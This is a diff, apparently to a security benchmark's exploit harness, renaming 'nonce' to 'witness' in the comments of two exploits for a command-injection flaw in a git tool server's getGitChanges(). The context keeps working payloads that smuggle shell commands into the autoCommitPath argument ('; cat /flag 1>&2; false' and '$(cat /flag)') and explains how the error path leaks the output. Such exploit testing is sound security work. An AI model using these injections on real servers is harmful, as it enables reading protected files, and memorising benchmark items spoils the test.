@@ -5,7 +5,7 @@ getGitChanges() in index.ts runs child_process.exec(`cd ${cwd}`) with the tool's
 the argument are interpreted by /bin/sh. The injected command only reaches the tool's response
 through the error path: the server's catch block folds the failed exec's stderr into the error
 text it returns, while a successful exec's stdout is discarded. Both exploits therefore write the
-nonce to stderr and force a non-zero exit so execAsync rejects: one appends `; cat /flag 1>&2;
+witness to stderr and force a non-zero exit so execAsync rejects: one appends `; cat /flag 1>&2;
 false`, the other substitutes `$(cat /flag)` into the cd target so the failed cd echoes it. The
 fix lives only on an unmerged fork PR (commit f7d992c830c5f2ec5749852e66c0195e3ed7fe30: upstream
 has published no tag, release or merge for this flaw), which replaces exec with execFile("git",
@@ -40,13 +40,13 @@ _TOOL = "git-changes-commit-message"
 
 
 async def _exploit_terminator(places: Places, client: KitClient) -> None:
-    # `; cat /flag 1>&2; false`: the nonce goes to stderr and `false` forces a non-zero exit, so
+    # `; cat /flag 1>&2; false`: the witness goes to stderr and `false` forces a non-zero exit, so
     # execAsync rejects and the server folds the stderr into the error text it returns verbatim.
     await client.call_tool(_TOOL, {"autoCommitPath": "/srv/app; cat /flag 1>&2; false"})
 
 
 async def _exploit_subshell(places: Places, client: KitClient) -> None:
-    # `$(cat /flag)`: command substitution expands the nonce into the cd target, and the failed
+    # `$(cat /flag)`: command substitution expands the witness into the cd target, and the failed
     # cd echoes it to stderr.
     await client.call_tool(_TOOL, {"autoCommitPath": "/tmp/$(cat /flag)"})
 
